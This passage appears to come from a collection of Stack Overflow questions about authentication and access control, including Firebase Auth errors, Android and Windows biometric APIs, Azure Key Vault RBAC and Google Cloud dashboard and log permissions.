    at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at java.base/java.lang.Thread.run(Thread.java:833) ~[na:na]

2024-03-07T14:07:39.018-03:00 DEBUG 4016 --- [nio-8080-exec-1] s.w.a.DelegatingAuthenticationEntryPoint : Trying to match using RequestHeaderRequestMatcher [expectedHeaderName=X-Requested-With, expectedHeaderValue=XMLHttpRequest]
2024-03-07T14:07:39.018-03:00 DEBUG 4016 --- [nio-8080-exec-1] s.w.a.DelegatingAuthenticationEntryPoint : No match found. Using default entry point org.springframework.security.web.authentication.www.BasicAuthenticationEntryPoint@39a54a32
2024-03-07T14:07:39.018-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.s.w.header.writers.HstsHeaderWriter  : Not injecting HSTS header since it did not match request to [Is Secure]
2024-03-07T14:07:39.019-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Trying to match request against DefaultSecurityFilterChain [RequestMatcher=Or [Mvc [pattern='/api/**']], Filters=[org.springframework.security.web.session.DisableEncodeUrlFilter@54052db, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@648d6e28, org.springframework.security.web.context.SecurityContextHolderFilter@6e5c0033, org.springframework.security.web.header.HeaderWriterFilter@28c8caa6, org.springframework.web.filter.CorsFilter@345b636a, org.springframework.security.web.authentication.logout.LogoutFilter@18dbee52, org.springframework.security.web.authentication.www.BasicAuthenticationFilter@422e9db2, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3083f3b9, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@78fb417b, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@22ebb5e, org.springframework.security.web.access.ExceptionTranslationFilter@7d16b4d6, org.springframework.security.web.access.intercept.AuthorizationFilter@1538a7d4]] (1/1)
2024-03-07T14:07:39.019-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : No security for POST /error
</code></pre>
"
"<p>i received a challenge on my job, that consists in develope a desktop system using java for collect biometrics data.
I decided to compile the java example they have on its own drive, but I'm not able to compile it due to it not recognizing the futronic drivers<a href=""https://i.stack.imgur.com/MBwhx.png"" rel=""nofollow noreferrer"">Error below</a></p>
<p>I tried compiling, changing the path and it still didn't work</p>
"
"<p>We are migrating to B2C. Current native solution uses libraries to do biometrics and calls APIs to authenticate with legacy IDP. We want to use web view for B2C on the native implementation and I read that it is not possible to incorporate biometrics into the web view and B2C flows out of the box.</p>
<p>How about if we continue to use the native libraries to pass the biometrics and then pass a signed input claim to a custom B2C sign in policy which can skip username/password screen and continue the journey to sign in the user? Is it a feasible solution?</p>
<p>I have not found any similar use cases and references other than the old <a href=""https://github.com/Azure-Samples/active-directory-b2c-advanced-policies/blob/54a6ac7bc65ce0ae4c6b5eb3f0621f5da5310dfc/wingtipgamesb2c/Policies/b2ctechready.onmicrosoft.com_B2C_1A_invitation.xml"" rel=""nofollow noreferrer"">WingtipGamesB2C sample repo for invitation flow</a> This sample uses a similar idea for create account passing in a user identifier to the policy as an input claim.</p>
"
"<p>Problem: The aim to the post is to find any way to use biometric verification(no system default) in autofill extension.</p>
<p>I've tried using ImagePicker, AVFoundation and AVCapture to open the camera, and I also tried using openUrl to open the main app to achieve my purpose. But in the end they all failed. I checked the document and found that autofill extension disabled these functions.</p>
<p>Is there any other way I can use my own biometric verification with autofill extension?</p>
"
"<p>I am using biometric authentication for getting into the app, but the problem is I am not getting option for face-authentication.
This is the gradle dependency
implementation &quot;androidx.biometric:biometric-ktx:1.2.0-alpha05&quot;
This is the code I am using, firstly checking if authentication is possible then using it</p>
<pre><code> if (CommonMethods.isBiometricReady(requireActivity())) {
            binding.tvBioMetric.visible()
        }
fun isBiometricReady(context: Context) =
            hasBiometricCapability(context) == BiometricManager.BIOMETRIC_SUCCESS

        private fun hasBiometricCapability(context: Context): Int {
            val biometricManager = BiometricManager.from(context)
            return biometricManager.canAuthenticate(BIOMETRIC_WEAK)
        }

private fun initBiometricPrompt(
        activity: AppCompatActivity
    ): BiometricPrompt {

        val executor = ContextCompat.getMainExecutor(activity)

        val callback = object : BiometricPrompt.AuthenticationCallback() {

            override fun onAuthenticationError(errorCode: Int, errString: CharSequence) {
                super.onAuthenticationError(errorCode, errString)
                Log.d(TAG, &quot;onAuthenticationError: &quot;)
            }

            override fun onAuthenticationFailed() {
                super.onAuthenticationFailed()
                Log.w(TAG, &quot;Authentication failed for an unknown reason&quot;)
            }

            override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
                super.onAuthenticationSucceeded(result)
                verified()
                Log.d(TAG, &quot;onAuthenticationSucceeded: ${result.cryptoObject}&quot;)
            }
        }

        // 3
        return BiometricPrompt(activity, executor, callback)
    }


  fun setBiometricPromptInfo(
            title: String,
            subtitle: String,
            description: String,
            allowDeviceCredential: Boolean
        ): BiometricPrompt.PromptInfo {
            val builder = BiometricPrompt.PromptInfo.Builder()
                .setTitle(title)
                .setSubtitle(subtitle)
                .setDescription(description)

            // Use Device Credentials if allowed, otherwise show Cancel Button
            builder.apply {
                if (allowDeviceCredential) setAllowedAuthenticators(BIOMETRIC_WEAK)
                else setNegativeButtonText(&quot;Cancel&quot;)
            }

            return builder.build()
        } ```

on click of tvBiometric
```initBiometricPrompt(requireActivity() as AppCompatActivity).authenticate(
                        setBiometricPromptInfo(&quot;Authentications&quot;, &quot;&quot;, &quot;&quot;, false)
                    )```

The scenario is I am not getting face authentication option at all, if both the fingerprint and face authentication is set on device, the function has Biometric returns true and shows option only for fingerprint authentication
Now if I disable fingerprint but face id is enabled then has biometric returns false, the issue is **face authentication doesn't work at all**
Please help how to resolve it.
I checked using this code also 
</code></pre>
<pre><code>    val biometricManager = BiometricManager.from(requireContext())
    when (biometricManager.canAuthenticate(BiometricManager.Authenticators.BIOMETRIC_WEAK or BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
        BiometricManager.BIOMETRIC_SUCCESS -&gt;
            (&quot;Biometric authentication is available&quot;).showToast(requireContext())

        BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -&gt;
            (&quot;This device doesn't support biometric authentication&quot;).showToast(requireContext())

        BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -&gt;
            (&quot;Biometric authentication is currently unavailable&quot;).showToast(requireContext())

       BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -&gt;
            (&quot;No biometric credentials are enrolled&quot;).showToast(requireContext())
    } ```
</code></pre>
<p>it returns BIOMETRIC_ERROR_NONE_ENROLLED even if face id is enrolled
I have also tried Biometric_Strong but this also doesn't work
I tested on device Xiaomi android version 12</p>
"
"<p>I'm developing a Windows bio-metric device driver for use with Windows Hello.</p>
<p>The challenge is enabling both Windows Hello and custom tools to access the driver simultaneously.</p>
<p>The question is how to enable non-exclusive access to the driver while still allowing Windows Hello to use the bio-metric device?</p>
<p>I've set the &quot;exclusive&quot; registry entry to 0 allows non-exclusive access, but Windows Hello fails to access the bio-metric device in this mode.</p>
"
"<p>I am currently working on an application that involves capturing fingerprint images using the Windows Biometric Framework Capture Sample. The application works fine with optical sensors found in laptops (which require swiping the finger). However, I am encountering an issue when attempting to use the same application with capacitive touch fingerprint sensors built into laptops.</p>
<p>Instead of obtaining a clear fingerprint image, the captured bytes seem to be encrypted or distorted in some way. I have attached an example image for reference.</p>
<p>I have tested this on different laptops, and the issue persists across all devices with capacitive touch sensors.</p>
<p>Has anyone else experienced a similar problem, or does anyone have insights into why this might be happening? Your assistance would be greatly appreciated.</p>
<p><a href=""https://i.stack.imgur.com/iq1ZA.png"" rel=""nofollow noreferrer"">Image from capacitive fingerprint sensor</a></p>
"
"<p>I am trying to maintain access control for google cloud monitoring custom dashboards.</p>
<p>For example, if I have 5 dashboards and 2 users, then one user should be able to see only 3 dashboards and the other user should be able to see the other 2 dashboards only. How do I maintain this segregation?</p>
<p>Tried the following approaches,</p>
<ol>
<li><p>Using IAM, didn't work as it was giving access for all dashboards.</p>
</li>
<li><p>By sharing the specific dashboard(s) directly to the user(s), didn't work as it was giving access for all dashboards.</p>
</li>
<li><p>Using IAM condition and dashboard labels, but could not create the IAM condition as it does not support labels and dashboards.</p>
</li>
</ol>
<p>Please suggest any solution if available, thanks in advance.</p>
<p>I am trying to maintain access control for the cloud monitoring custom dashboards, i.e. users will only be able to access the specific dashboards which they are required to access.</p>
"
"<p><a href=""https://i.stack.imgur.com/itbwK.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
<p>Hi, I downloaded open source to build the packaging version of Unreal Engine.</p>
<p>This error occurs when trying to build.</p>
<p><code>Error CS1069 Namespace 'System.Security' does not have the format 'XmlSyntaxException'. This format was passed to the assembly 'System.Security.Permissions, Version=0.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2dd51'. Please add a reference for the assembly.</code></p>
<p>If anyone knows why, please let me know. Thank you.</p>
<p>I searched to download XmlSyntaxException on Nuget, but nothing came up. Something seems to be missing from an existing file, but I can't find a way to recover it.</p>
"
"<p>I have a sign-up form which allows Users to enter their credentials (email, password, etc.), which should create a Firebase Auth account, and a record of the other details in MongoDB.
My required flow is that the User enters their details, clicks on the sign-up button, which executes the following sequence:</p>
<ol>
<li>first makes a <code>POST</code> request to save the details in MongoDB</li>
<li><code>createUserWithEmailAndPassword</code> method provided by <code>getAuth()</code>. I'm also modifying the claims of the created account by using the <code>beforeUserCreated</code> and <code>beforeUserSignedIn</code> methods imported from <code>firebase-functions/v2/identity</code> in Firebase Functions, just before the account is actually created.</li>
</ol>
<p>I'm consistently getting an error recently, and the error logs aren't very helpful to me. Even <code>signInWithGoogle</code> gives this same error in the browser:</p>
<p>Error:</p>
<pre><code>FirebaseError: Firebase: Error (auth/error-code:-47).
    at Tn (assert.ts:136:55)
    at vn (assert.ts:65:9)
    at Mn (index.ts:210:9)
    at async Rn (index.ts:231:9)
    at async ai (email_and_password.ts:283:9)
</code></pre>
<p>Here's the code for the user authentication:</p>
<p>EmailSignUp function that handles the form submission for email/password account:</p>
<pre><code>function emailSignUp(event) {
        setSignUpClicked(true);
        event.preventDefault();
        if (password !== confirmPassword) {
            console.log(&quot;Passwords do not match!&quot;);
            setSignUpClicked(false);
            return;
        }

        // let files = document.querySelector('input[type=&quot;file&quot;]').files;
        let formData = new FormData(document.getElementById(&quot;emailSignUp&quot;));

        fetch(`${process.env.REACT_APP_DEPLOYED_API_URL}/auth/user/register`, {
            method: &quot;POST&quot;,
            body: formData,
        })
            .then((response) =&gt; response.json())
            .then((data) =&gt; {
                if (data.status === &quot;error&quot;) {
                    setStatus(&quot;failure&quot;);
                    setSignUpClicked(false);
                    throw new Error(&quot;Invalid form input. Please check again.&quot;);
                } else {
                    // fix auth-function deadline error by maybe creating firebase user first.
                    createUserWithEmailAndPassword(auth, email, password)
                        .then((userCredential) =&gt; {
                            // Signed Up
                            setStatus(&quot;success&quot;);
                            setSignUpClicked(false);
                            setShowMyModal(true);
                        })
                        .catch((error) =&gt; {
                            const errorCode = error.code;
                            const errorMessage = error.message;
                            setStatus(&quot;failure&quot;);
                            setSignUpClicked(false);
                            console.log(error);
                        });
                    console.log(&quot;Success:&quot;, data);
                }
            })
            .catch((error) =&gt; {
                setStatus(&quot;failure&quot;);
                setSignUpClicked(false);
                console.error(&quot;Error:&quot;, error);
            });

        /* 
            
             */
    }
</code></pre>
<p>index.js (Firebase Functions)</p>
<pre><code>export const beforecreated = beforeUserCreated(async (event) =&gt; {
    try {
        const email = event.data.email;
        const checkUser = await User.findOne({ email: event.data.email });

        //when sign in with google is clicked
        if (event.additionalUserInfo.providerId === &quot;google.com&quot;) {
            const checkOrg = await Organization.findOne({ email });
            if (checkUser) {
                return {
                    displayName: checkUser.name,
                    customClaims: {
                        role: &quot;user&quot;,
                        userId: checkUser._id,
                    },
                };
            } else if (checkOrg) {
                return {
                    displayName: checkUser.name,
                    customClaims: {
                        role: &quot;org&quot;,
                        orgId: checkUser._id,
                    },
                };
            } else {
                //google sign in and user not in db
                //create user in db
                const name = event.data.displayName;
                const email = event.data.email;
                const photoURL = event.data.photoURL;

                const response = await fetch(photoURL);
                const buffer = await response.arrayBuffer();
                console.log(&quot;BUFFER: &quot;, buffer);
                const storagePath = `user/${email}/profile.jpeg`;
                const storageRef = ref(storage, storagePath);
                const metadata = {
                    contentType: &quot;image/jpeg&quot;,
                };
                const snapshot = await uploadBytesResumable(
                    storageRef,
                    buffer,
                    metadata
                );
                if (snapshot.state === &quot;success&quot;) {
                    const user = await User.create({
                        name,
                        email,
                        photoPathFirestore: storagePath,
                    });
                    console.log(&quot;Successfully created new user in DB!&quot;);
                    return {
                        displayName: user.name,
                        customClaims: {
                            role: &quot;user&quot;,
                            userId: user._id,
                        },
                    };
                } else {
                    throw new Error(&quot;Error occurred while creating User&quot;);
                }
            }
        } else {
            //email/password sign in
            if (checkUser) {
                return {
                    customClaims: {
                        role: &quot;user&quot;,
                    },
                };
            }
            return {
                customClaims: {
                    role: &quot;org&quot;,
                },
            };
        }
    } catch (err) {
        throw new Error(err);
    }
});

export const beforesignin = beforeUserSignedIn(async (event) =&gt; {
    try {
        const email = event.data.email;
        const checkUser = await User.findOne({ email });

        if (checkUser) {
            return {
                displayName: checkUser.name,
                customClaims: {
                    role: &quot;user&quot;,
                    userId: checkUser._id,
                },
            };
        } else {
            const checkOrg = await Organization.findOne({ email });
            return {
                displayName: checkOrg.name,
                customClaims: {
                    role: &quot;org&quot;,
                    orgId: checkOrg._id,
                },
            };
        }
    } catch (err) {
        console.log(err);
        throw new Error(err);
    }
});
</code></pre>
<p><code>api/user/register</code> to create the User in DB</p>
<pre><code>router.post(&quot;/register&quot;, async (req, res) =&gt; {
    try {
        const { name, email, phone } = req.body;

        //email variable, update record in DB
        if (!name || !email) {
            throw new Error(
                &quot;Following fields are mandatory: name, email, password, photo&quot;
            );
        } else {
            if (!req.files[0]) {
                throw new Error(
                    &quot;Following fields are mandatory: name, email, password, photo&quot;
                );
            }
            const file = req.files[0];
            const filename = file.originalname;
            const extension = filename.split(&quot;.&quot;).pop();
            if (
                extension !== &quot;png&quot; &amp;&amp;
                extension !== &quot;jpg&quot; &amp;&amp;
                extension !== &quot;jpeg&quot;
            ) {
                response_400(
                    res,
                    &quot;Invalid file format. Only .jpg, .png, .jpeg files are allowed&quot;
                );
            } else {
                // Resize image and get extension
                Jimp.read(file.buffer)
                    .then((image) =&gt; {
                        // Convert the image to JPEG with quality 100 (you can adjust the quality as needed)
                        return image
                            .quality(100)
                            .getBufferAsync(Jimp.MIME_JPEG);
                    })
                    .then(async (jpegBuffer) =&gt; {
                        console.log(&quot;Image converted successfully!&quot;);
                        // Now you have the converted buffer (jpegBuffer) that you can use

                        const pathToFile = `user/${email}/profile.jpeg`;
                        const storageRef = ref(storage, pathToFile);

                        const metadata = {
                            contentType: &quot;image/jpeg&quot;,
                        };

                        const snapshot = await uploadBytesResumable(
                            storageRef,
                            jpegBuffer,
                            metadata
                        );
                        if (snapshot.state === &quot;success&quot;) {
                            const user = await User.create({
                                name,
                                email,
                                photoPathFirestore: pathToFile,
                                phone,
                            });
                            console.log(&quot;Successfully created new user in DB!&quot;);
                            response_200(
                                res,
                                &quot;Successfully created new user in DB&quot;
                            );
                        } else {
                            response_500(
                                res,
                                &quot;Error occurred while uploading user file&quot;
                            );
                        }
                    })
                    .catch((err) =&gt; {
                        console.error(&quot;Error converting image:&quot;, err);
                        response_500(res, &quot;Error converting image&quot;);
                    });
            }
        }
    } catch (err) {
        console.log(err);
        res.send(err);
    }
});
</code></pre>
<p>How do I get rid of the <code>FirebaseError: Firebase: Error (auth/error-code:-47).</code> error?</p>
"
"<p>I send the user a password reset email with this code:</p>
<pre><code>Future passwordReset() async {
    try {
      await FirebaseAuth.instance.sendPasswordResetEmail(email: _emailController.text.trim());
            showDialog(context: context, builder: (context) {
              return AlertDialog(content: Text(&quot;Email sent successfully!&quot;),);
            });
    } on FirebaseAuthException catch(e) {
      print(e);
      showDialog(context: context, builder: (context) {
        return AlertDialog(content: Text(e.message.toString()),);
      });
    }
  }
</code></pre>
<p>But in the console I get:</p>
<pre><code>I/FirebaseAuth(22362): Password reset request email@gmail.com with empty reCAPTCHA token
D/NetworkSecurityConfig(22362): No Network Security Config specified, using platform default
W/System  (22362): Ignoring header X-Firebase-Locale because its value was null.
W/LocalRequestInterceptor(22362): Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: No AppCheckProvider installed.
I/System.out(22362): [okhttp]:check permission begin!
I/.app(22362): The ClassLoaderContext is a special shared library.
I/System.out(22362): [okhttp]:not MMS!
I/System.out(22362): [okhttp]:not Email!
I/System.out(22362): [socket]:check permission begin!
</code></pre>
<p>How can I add reCAPTCHA to my app?</p>
"
"<h3> Not receiving OTP on Mobile But Works on Web.</h3>
I'm trying to authenticate my users mobile number as usual by firebase auth .
The Problem is I am **not able to receive otp** on emulator as well as my physical device .
But whenever i run my app on chrome using this command :
<pre><code>flutter run -d chrome 
</code></pre>
<p>I enter the same mobile number but i am receiving otp with this and not on mobile devices.
I can't figure out why its happening .
Also the otp process completes sucessfully when I'm using test phone numbers offered by firebase.</p>
<p>Following is my code for the otp verification:</p>
<pre><code>void signInWithPhone(BuildContext context, String phoneNumber) async {
try {
  await auth.verifyPhoneNumber(
      phoneNumber: phoneNumber,
      verificationCompleted: (PhoneAuthCredential credential) async {
        print('Before-signing in with credential');
        await auth.signInWithCredential(credential);
        debugPrint('After-signing in with credential');
      },
      verificationFailed: (e) {
        debugPrint(e.message.toString());
        debugPrint(&quot; THIS IS ERROR ${e.message}&quot;);
        showSnackbar(context: context, content: e.message!.trim());
        throw Exception(e.message);
      },
      codeSent: ((String verificationId, int? resendToken) async {
        debugPrint('Code sent');
        Navigator.pushNamed(context, OTPScreen.routeName,
            arguments: verificationId);
      }),
      codeAutoRetrievalTimeout: (String verificationId) {
        debugPrint('Auto retrieval timeout');
      });
} on FirebaseAuthException catch (e) {
  debugPrint(e.message!);
  debugPrint(e.toString());
  showSnackbar(context: context, content: e.message!);
}
</code></pre>
<p>}</p>
<p>And I'm calling the above function in the following ways :</p>
<pre><code>void sendPhoneNumber() {
try {
  debugPrint('VerificationCompleted');
  String phoneNumber = phoneController.text.trim();
  if (country != null &amp;&amp; phoneNumber.isNotEmpty) {
    ref
        .read(authControllerProvider)
        .signInWithPhone('+${country!.phoneCode}$phoneNumber', context);
  }
} catch (e) {
  showSnackbar(context: context, content: 'Fill the phone number field');
}
</code></pre>
<p>}</p>
<p>I get the following errors :</p>
<pre><code> Play Integrity Token fetch failed, falling back to Recaptcha-9: Integrity API error (-9): Binding to the service in the Play Store has failed. This can be due to having an old Play Store version installed on the device.
E/zzb     ( 4546): Ask the user to update Play Store.
E/zzb     ( 4546):  (https://developer.android.com/google/play/integrity/reference/com/google/android/play/core/integrity/model/IntegrityErrorCode.html#CANNOT_BIND_TO_SERVICE).
D/EGL_emulation( 4546): app_time_stats: avg=632.60ms min=33.58ms max=1231.62ms count=2
W/System  ( 4546): Ignoring header X-Firebase-Locale because its value was null.
W/LocalRequestInterceptor( 4546): Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: No AppCheckProvider installed.
E/OpenGLRenderer( 4546): Unable to match the desired swap behavior.
E/FirebaseAuth( 4546): [GetAuthDomainTask] Error getting project config. Failed with INVALID_CERT_HASH 400
E/zzb     ( 4546): Failed to get reCAPTCHA token with error [There was an error while trying to get your package certificate hash.]- calling backend without app verification
W/WindowOnBackDispatcher( 4546): sendCancelIfRunning: isInProgress=falsecallback=android.view.ViewRootImpl$$ExternalSyntheticLambda17@cbdc15b
D/EGL_emulation( 4546): app_time_stats: avg=1098.10ms min=1098.10ms max=1098.10ms count=1
W/System  ( 4546): Ignoring header X-Firebase-Locale because its value was null.
W/LocalRequestInterceptor( 4546): Error getting App Check token; using placeholder token instead. Error: com.google.firebase.FirebaseException: No AppCheckProvider installed.
E/FirebaseAuth( 4546): [SmsRetrieverHelper] SMS verification code request failed: unknown status code: 17093 null
D/FirebaseAuth( 4546): Invoking original failure callbacks after phone verification failure for +917387251914, error - This request is missing a valid app identifier, meaning that Play Integrity checks, and reCAPTCHA checks were unsuccessful. Please try again, or check the logcat for more details.
D/CompatibilityChangeReporter( 4546): Compat change id reported: 247079863; UID 10192; state: DISABLED
I/flutter ( 4546): This request is missing a valid app identifier, meaning that Play Integrity checks, and reCAPTCHA checks were unsuccessful. Please try again, or check the logcat for more details.
I/flutter ( 4546):  THIS IS ERROR This request is missing a valid app identifier, meaning that Play Integrity checks, and reCAPTCHA checks were unsuccessful. Please try again, or check the logcat for more details.

</code></pre>
<p>Steps I performed till now :</p>
<ol>
<li>Configured the correct SHA keys and added it to firebase</li>
<li>Upgraded to the latest versions of dependencies.</li>
<li>Browse every possible question and answer on here as well as on google.</li>
</ol>
"
"<pre><code>**CODE**: Forbidden

**MESSAGE**
The operation is not allowed by RBAC. If role assignments were recently changed, please wait several minutes 
for role assignments to become effective.
**RAW ERROR**
Caller is not authorized to perform action on resource. If role assignments, deny assignments or 
role definitions were changed recently, please observe propagation time. 
Caller: appid=guidId;oid=guidid;iss=https://sts.windows.net/guidid/ Action: 'Microsoft.KeyVault/vaults/secrets/setSecret/action' 
**Resource**: '/subscriptions/subs_id/resourcegroups/networkwatcherrg/providers/microsoft.keyvault/vaults/vickyskeyvault001/secrets/productiondbpassword' 
Assignment: (not found) DenyAssignmentId: null DecisionReason: null Vault: vickyskeyvault001;location=centralindia
</code></pre>
<p>Even though I have owner role on keyvault and also subscription:</p>
<p><a href=""https://i.stack.imgur.com/4Ssmj.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/4Ssmj.png"" alt=""enter image description here"" /></a></p>
<p>It's been more than 10 minutes, the message didn't go:</p>
<p><a href=""https://i.stack.imgur.com/t8MOv.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/t8MOv.png"" alt=""enter image description here"" /></a></p>
<p><strong>Message</strong>:
<code>The operation is not allowed by RBAC. If role assignments were recently changed, please wait several minutes for role assignments to become effective.</code></p>
"
"<p>I'm using Firebase Auth for my web app.</p>
<p>What I need from that service is user database and all things related to that. Easy implementation of different providers.</p>
<p>Thou I have few doubts and web implementation.</p>
<p>Why passwordHash is returned for user logging with email + pwd? There's no clear instruction how to disable that. I really would like to avoid sending password - even in hash form no more than needed - which is initial login - then we use JWT right?
I really find it troubling to get my passwordHash whenever <a href=""https://identitytoolkit.googleapis.com/v1/accounts:lookup"" rel=""nofollow noreferrer"">https://identitytoolkit.googleapis.com/v1/accounts:lookup</a> is called for session check</p>
<p>Beside, I don't want to know user displaynames, almost anything.</p>
<p>Yet, there's no telling to Firebase to not send them back nor send them to me. I can ignore, but I'd prefer to avoid that, cause privacy policy is harder because of that.</p>
"
"<p>I have a live Flutter App that uses firebase Datastore.</p>
<ul>
<li><p>When the user is logged out and I make changes to the user doc and the user logs back in the changes I have made in the firestore database stay. ( Correct function )</p>
</li>
<li><p>When the user is logged in and using the app and I make changes to the user doc the changes I have made in the firestore database stay. ( Correct function )</p>
</li>
<li><p>** When the user is logged in and backgrounds the app by using another app or locking the phone and I make changes to the user doc then the user resumes the app the data I have changed in the user doc reverts to the old data. ** ( incorrect function ) this only happens on a real device and not and emulator.</p>
</li>
</ul>
<p>What is the issue I have tried incorporating this code in the main then i tried incorporating it in other screens of the app. Sent to test flight and issue is still present.</p>
<pre><code>
@override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    if (state == AppLifecycleState.resumed) {
      userState.refreshUserData();
      topicsManager();
      print('App resumed - refreshing data');
    }
  } 


  @action
  Future&lt;void&gt; refreshUserData() async {
    try {
      print('Refreshing user data...');

      final docSnapshot = await FirebaseFirestore.instance
          .collection(USERS_COLLECTION)
          .doc(docId) // Ensure 'docId' is correctly set
          .get(GetOptions(
              source: Source.server)); 

      if (docSnapshot.exists) {
        Map&lt;String, dynamic&gt; latestUserData =
            docSnapshot.data() as Map&lt;String, dynamic&gt;;
        Map&lt;String, dynamic&gt; latestUserBeeInfo =
            latestUserData['beeInfo'] as Map&lt;String, dynamic&gt;;
        String? latestBeeType = latestUserBeeInfo['beeType'];

        // Directly compare necessary fields or utilize a method if complex logic is needed
        // For simplicity, assuming direct field checks here:
        if (me.displayName != latestUserData['displayName'] ||
            me.email != latestUserData['email'] ||
            me.userBeeInfoField.beeType != latestBeeType) {
          loadUser(latestUserData, docId);
          print('User data updated with fresh data.');
        } else {
          print('No changes in user data detected.');
        }
      } else {
        print('User data document does not exist.');
      }
    } catch (e) {
      print('Error refreshing user data: $e');
    }
  }

What is the issue I have tried incorporating this code in the main then i tried incorporating it in other screens of the app. Sent to test flight and issue is still present.  

 @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    if (state == AppLifecycleState.resumed) {
      userState.refreshUserData();
      topicsManager();
      print('App resumed - refreshing data');
    }
  } 


  @action
  Future&lt;void&gt; refreshUserData() async {
    try {
      print('Refreshing user data...');

      final docSnapshot = await FirebaseFirestore.instance
          .collection(USERS_COLLECTION)
          .doc(docId) // Ensure 'docId' is correctly set
          .get(GetOptions(
              source: Source.server)); 

      if (docSnapshot.exists) {
        Map&lt;String, dynamic&gt; latestUserData =
            docSnapshot.data() as Map&lt;String, dynamic&gt;;
        Map&lt;String, dynamic&gt; latestUserBeeInfo =
            latestUserData['beeInfo'] as Map&lt;String, dynamic&gt;;
        String? latestBeeType = latestUserBeeInfo['beeType'];

        // Directly compare necessary fields or utilize a method if complex logic is needed
        // For simplicity, assuming direct field checks here:
        if (me.displayName != latestUserData['displayName'] ||
            me.email != latestUserData['email'] ||
            me.userBeeInfoField.beeType != latestBeeType) {
          loadUser(latestUserData, docId);
          print('User data updated with fresh data.');
        } else {
          print('No changes in user data detected.');
        }
      } else {
        print('User data document does not exist.');
      }
    } catch (e) {
      print('Error refreshing user data: $e');
    }
  } 
</code></pre>
<p>This is my authgate which is where the app goes on resume</p>
<pre><code>      final bool isGoogleSignIn;
      final bool isAppleSignIn;
      final String? phoneNumber;
      const AuthGate(
          {Key? key,
          this.isGoogleSignIn = false,
          this.phoneNumber,
          this.isAppleSignIn = false})
          : super(key: key);
    
      @override
      Widget build(BuildContext context) {
        return StreamBuilder&lt;User?&gt;(
          stream: FirebaseAuth.instance.authStateChanges(),
          builder: (context, snapshot) {
            if (snapshot.hasData) {
              return UserDataProvider(userId: snapshot.data!.uid);
            } else {
              return Homedashboard(); // Non-authenticated entry point
            }
          },
        );
      }
    }
    
    class UserDataProvider extends StatefulWidget {
      final String userId;
      final bool isGoogleSignIn;
      final bool isAppleSignIn;
      final String? phoneNumber;
    
      const UserDataProvider({
        Key? key,
        required this.userId,
        this.isGoogleSignIn = false,
        this.phoneNumber,
        this.isAppleSignIn = false,
      }) : super(key: key);
    
      @override
      _UserDataProviderState createState() =&gt; _UserDataProviderState();
    }
    
    class _UserDataProviderState extends State&lt;UserDataProvider&gt; {
      @override
      Widget build(BuildContext context) {
        return StreamBuilder&lt;DocumentSnapshot&gt;(
          stream: FirebaseFirestore.instance
              .collection(&quot;users&quot;)
              .doc(widget.userId)
              .snapshots(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.active) {
              if (snapshot.hasData &amp;&amp; snapshot.data!.exists) {
                final userData = snapshot.data!.data() as Map&lt;String, dynamic&gt;;
                final userDto = UserDto.decode(userData);
                userState.loadUser(
                    userDto,
                    snapshot.data!
                        .id); // Assuming loadUser is adapted to accept UserDto
                return Homedashboard(); // Authenticated entry point with user data loaded
              } else {
                if (widget.isGoogleSignIn || widget.isAppleSignIn) {
                  return NewUserOtherProvider(
                      dynamicEmail: SharedState().email ?? &quot;&quot;);
                } else if (widget.phoneNumber != null) {
                  // Handle phone number sign-in logic here
                } else {
                  return const NewUserSignUp(); // Sign-up for other methods
                }
                return NewUserSignUp(); // Or any other appropriate widget for new users
              }
            }
    
            // While waiting for data or in case of an error
            return Loading(); // Placeholder for a loading widget
          },
        );
      }
    }```

</code></pre>
"
"<p>I am trying to maintain access control for google cloud logging.</p>
<p>For example, I have a compute engine VM, inside which multiple applications are running inside an OpenShift cluster e.g. application 1, application 2 etc. I want to send these application specific logs to log buckets.</p>
<p>Is it possible, that people who are working on application 1 in VM can only see logs specific to application 1, whereas people working on application 2 in VM can only see logs specific to application 2.</p>
<p>Condition - same VM, different applications, people see logs only for the applications they are working on.</p>
<p>My approach is to create log views then control access based on bucket level access and field level access. Is it possible to do in this way?</p>
<p>Please suggest any other solution if available, thanks in advance.</p>
"
"<p>I have a view where the user can sign in and out, currently email and Google sign in are supported. Signing in with Google works fine, however when the user signs out and then tries to sign in again with Google, nothing happens, a spinner is shown for ever on the 'Sign in' button (waiting before trying to sign in makes no difference).</p>
<pre><code>import 'package:firebase_ui_auth/firebase_ui_auth.dart';
import 'package:flutter/material.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:google_sign_in/google_sign_in.dart';

final GoogleSignIn _googleSignIn = GoogleSignIn();

class AuthenticationScreen extends StatelessWidget {
  const AuthenticationScreen({super.key});

  Future&lt;void&gt; signout() async {
    await _googleSignIn.disconnect();
    await _googleSignIn.signOut();
    await FirebaseAuth.instance.signOut();
  }

  @override
  Widget build(BuildContext context) {
    return StreamBuilder&lt;User?&gt;(
      stream: FirebaseAuth.instance.authStateChanges(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) {
          return const SizedBox(
            height: 600,
